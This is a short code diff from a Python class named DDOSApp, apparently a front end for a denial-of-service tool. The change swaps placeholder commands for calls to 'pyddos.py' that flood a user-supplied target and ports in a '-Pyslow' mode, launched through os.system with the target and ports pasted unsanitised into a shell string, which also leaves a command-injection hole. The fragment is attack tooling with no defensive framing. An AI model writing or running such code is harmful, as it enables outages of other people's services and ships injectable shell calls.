@@ -47,10 +47,10 @@ class DDOSApp:
             if ports:
                 ports = ports.split(',')
                 # Call your attack script here with the provided ports
-                command = f"python your_attack_script.py -d {target} -p {' '.join(ports)} -Pyslow"  # Example command
+                command = f"pyddos.py -d {target} -p {' '.join(ports)} -Pyslow"  
             else:
                 # Call your attack script here with scanned ports
-                command = f"python your_attack_script.py -d {target} -Pyslow"  # Example command
+                command = f"pyddos.py -d {target} -Pyslow"  
             os.system(command)
         except Exception as e:
             print("Error during attack:", e)
